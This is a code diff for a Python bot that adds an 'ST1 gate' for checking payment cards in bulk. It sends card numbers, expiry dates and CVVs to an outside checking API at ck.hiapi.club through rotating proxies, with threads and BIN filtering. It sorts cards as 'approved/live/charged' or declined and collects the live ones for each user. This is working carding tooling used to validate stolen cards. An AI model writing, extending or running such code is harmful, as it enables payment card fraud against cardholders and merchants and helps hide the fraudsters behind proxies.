@@ -407,6 +407,151 @@ def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
     except Exception as e:
         return f"Error: {str(e)}"
 
+# ============================================================
+#  ST1 Gate — hiapi checker
+# ============================================================
+ST1_API_URL = "https://ck.hiapi.club/api/check3"
+
+
+def format_proxy_for_api(proxy_str):
+    """Format proxy to ip:port:user:pass for the API param."""
+    if not proxy_str:
+        return None
+    parts = proxy_str.strip().split(':')
+    if len(parts) == 2:
+        return proxy_str.strip()
+    elif len(parts) == 4:
+        return proxy_str.strip()
+    return None
+
+
+def run_st1_check(card_num, card_mm, card_yy, card_cvv, proxy_str=None):
+    """Single card check via hiapi."""
+    try:
+        card_param = f"{card_num}|{card_mm}|{card_yy}|{card_cvv}"
+        params = {"c": card_param}
+        if proxy_str:
+            params["p"] = proxy_str
+
+        resp = requests.get(ST1_API_URL, params=params, timeout=30)
+        text = resp.text.strip()
+
+        # Parse response — typically returns status info
+        if resp.status_code != 200:
+            return f"Error: API returned {resp.status_code}"
+
+        # Try to detect approved/declined from response
+        lower = text.lower()
+        if any(w in lower for w in ["approved", "success", "live", "charged"]):
+            return f"Approved | {text}"
+        elif any(w in lower for w in ["declined", "dead", "fail", "insufficient", "do not honor"]):
+            return f"Declined | {text}"
+        else:
+            return f"Unknown | {text}"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
+def process_single_st1(entry, proxies_list, user_id):
+    """Process a single card entry for ST1 gate."""
+    raw_proxy = random.choice(proxies_list) if proxies_list else None
+    api_proxy = format_proxy_for_api(raw_proxy)
+
+    try:
+        c_data = entry.split('|')
+        if len(c_data) == 4:
+            c_num, c_mm, c_yy, c_cvv = [x.strip() for x in c_data]
+
+            # BIN FILTER
+            user_bin_list = user_bins.get(user_id)
+            if user_bin_list:
+                if not any(c_num.startswith(b) for b in user_bin_list):
+                    return "SKIPPED | BIN not allowed"
+
+            result = run_st1_check(c_num, c_mm, c_yy, c_cvv, api_proxy)
+        else:
+            result = "Error: Invalid Format"
+    except Exception as e:
+        result = f"Error: {str(e)}"
+
+    return result
+
+
+def run_st1_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS):
+    """Mass processing runner for ST1 gate."""
+    # Load global proxies
+    proxies_list = []
+    if os.path.exists(PROXIES_FILE):
+        with open(PROXIES_FILE, 'r') as f:
+            proxies_list = [line.strip() for line in f if line.strip()]
+
+    # Load user's personal proxies and merge
+    user_proxy_file = os.path.join(USER_PROXIES_DIR, f"{user_id}.txt")
+    if os.path.exists(user_proxy_file):
+        with open(user_proxy_file, 'r') as f:
+            personal = [line.strip() for line in f if line.strip()]
+            proxies_list = proxies_list + personal
+
+    total = len(lines)
+    results = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": total, "approved_list": []}
+    results_lock = threading.Lock()
+    processed = [0]
+
+    def worker(entry):
+        if cancel_flags.get(user_id):
+            return None
+        entry = entry.strip()
+        if not entry:
+            return ("", "INVALID", "Empty line", "error")
+
+        result = process_single_st1(entry, proxies_list, user_id)
+
+        if "SKIPPED" in result:
+            category = "skipped"
+            status = "SKIPPED"
+        elif "Approved" in result:
+            category = "approved"
+            status = "APPROVED"
+        elif "Declined" in result:
+            category = "declined"
+            status = "DECLINED"
+        else:
+            category = "error"
+            status = "ERROR"
+
+        detail = result.split(" | ", 1)[1] if " | " in result else result
+        return (entry, status, detail, category)
+
+    max_workers = max(1, min(threads, total, 10))
+
+    with ThreadPoolExecutor(max_workers=max_workers) as pool:
+        futures = {pool.submit(worker, line): i for i, line in enumerate(lines)}
+        for fut in as_completed(futures):
+            if cancel_flags.get(user_id):
+                break
+            result = fut.result()
+            if result is None:
+                continue
+            entry, status, detail, category = result
+            with results_lock:
+                if category == "approved":
+                    results["approved"] += 1
+                    results["approved_list"].append(entry)
+                elif category == "declined":
+                    results["declined"] += 1
+                elif category == "skipped":
+                    results["skipped"] += 1
+                else:
+                    results["errors"] += 1
+                processed[0] += 1
+                idx = processed[0]
+            if on_progress:
+                on_progress(idx, total, results, entry, status, detail)
+
+    if on_complete:
+        on_complete(results)
+    return results
+
 
 def format_proxy(proxy_str):
     if not proxy_str: return None
